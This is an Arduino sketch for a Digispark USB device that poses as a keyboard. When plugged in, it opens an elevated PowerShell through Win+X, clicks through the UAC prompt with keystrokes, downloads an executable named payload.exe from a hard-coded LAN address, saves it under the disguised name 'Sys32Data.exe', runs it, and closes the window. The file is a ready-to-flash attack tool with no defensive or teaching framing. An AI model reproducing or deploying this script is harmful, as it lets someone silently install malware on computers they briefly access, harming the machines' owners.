#include "DigiKeyboard.h"

void setup() {
}

void loop() {
 int d=1000;
   DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
  DigiKeyboard.delay(1200);
  DigiKeyboard.sendKeyStroke(KEY_A);
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(KEY_S, MOD_ALT_LEFT);
  DigiKeyboard.delay(1000);
 DigiKeyboard.delay(5000);
 DigiKeyboard.print("$client = new-object System.Net.WebClient");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(d);
 DigiKeyboard.print("$client.DownloadFile('http://192.168.1.198/payload.exe','Sys32Data.exe')");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.print("start Sys32Data.exe");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(1000);
 DigiKeyboard.sendKeyStroke(KEY_F4|MOD_ALT_LEFT);
 DigiKeyboard.delay(50000);
}
